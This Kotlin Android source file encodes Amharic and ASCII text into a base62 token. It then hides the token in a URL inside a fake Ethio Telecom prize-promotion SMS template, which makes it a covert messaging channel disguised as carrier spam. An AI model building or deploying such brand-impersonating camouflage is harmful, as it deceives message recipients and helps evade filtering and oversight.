package com.example.myandroid

import android.content.Context
import org.json.JSONArray

object FidelCipher {
    private const val BASE62 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    
    // The 34 root Unicode points for the Amharic Fidel families
    private val AMHARIC_BASES = intArrayOf(
        0x1200, 0x1208, 0x1210, 0x1218, 0x1220, 0x1228, 0x1230, 0x1238,
        0x1240, 0x1260, 0x1270, 0x1278, 0x1280, 0x1290, 0x1298, 0x12A0,
        0x12A8, 0x12B0, 0x12B8, 0x12C8, 0x12D0, 0x12D8, 0x12E0, 0x12E8,
        0x12F0, 0x12F8, 0x1300, 0x1320, 0x1328, 0x1330, 0x1338, 0x1340,
        0x1348, 0x1350
    )

    fun encode(text: String): String {
        val indices = mutableListOf<Int>()
        for (c in text) {
            var found = false
            
            // 1. Check Amharic Matrix (0 - 237)
            for (i in AMHARIC_BASES.indices) {
                val base = AMHARIC_BASES[i]
                if (c.code in base..(base + 6)) {
                    indices.add(i * 7 + (c.code - base))
                    found = true
                    break
                }
            }
            if (found) continue
            
            // 2. Check Standard English/ASCII (32 to 126)
            // This perfectly covers A-Z, a-z, 0-9, spaces, and standard punctuation (!@#$%^&*)
            if (c.code in 32..126) {
                indices.add(239 + (c.code - 32))
                continue
            }
            
            // 3. Check Newline \n
            if (c == '\n') {
                indices.add(334)
                continue
            }
            
            // 4. Unknown/Emoji Fallback (Assign to 238)
            indices.add(238)
        }

        // Pad to ensure even pairs (using Space, which is ASCII 32 -> index 239)
        if (indices.size % 2 != 0) indices.add(239)

        val token = java.lang.StringBuilder()
        // 2-to-3 Chunking (Math: 335^2 = 112,225 <= 62^3 (238,328) )
        val maxBase = 335
        for (i in indices.indices step 2) {
            val a = indices[i]
            val b = indices[i+1]
            var value = a * maxBase + b
            
            var chunk = ""
            for (j in 0..2) {
                chunk = BASE62[value % 62] + chunk
                value /= 62
            }
            token.append(chunk)
        }
        return token.toString()
    }

    fun camouflage(ctx: Context, payloadToken: String): String {
        val prefs = ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val templatesStr = prefs.getString("promo_templates", "[]")
        var templates = try { 
            JSONArray(templatesStr!!) 
        } catch (e: Exception) { 
            JSONArray()
        }

        // If the array is empty (default state), inject the primary camouflage template
        if (templates.length() == 0) {
            templates.put("በቴሌዊን ጨዋታዎች እየተዝናኑ ይሸለሙ!\n\nጥያቄዎችን በመመለስ ይሸለሙ!\nለመመዝገብ መረጃ ለማግኘት፡\nhttp://tele-promo.et/v?d=[TOKEN]\n\nኢትዮ ቴሌኮም")
        }

        // Pick a random template from the available pool
        val template = templates.optString((0 until templates.length()).random(), "http://tele-promo.et/v?d=[TOKEN]")
        return template.replace("[TOKEN]", payloadToken)
    }
}
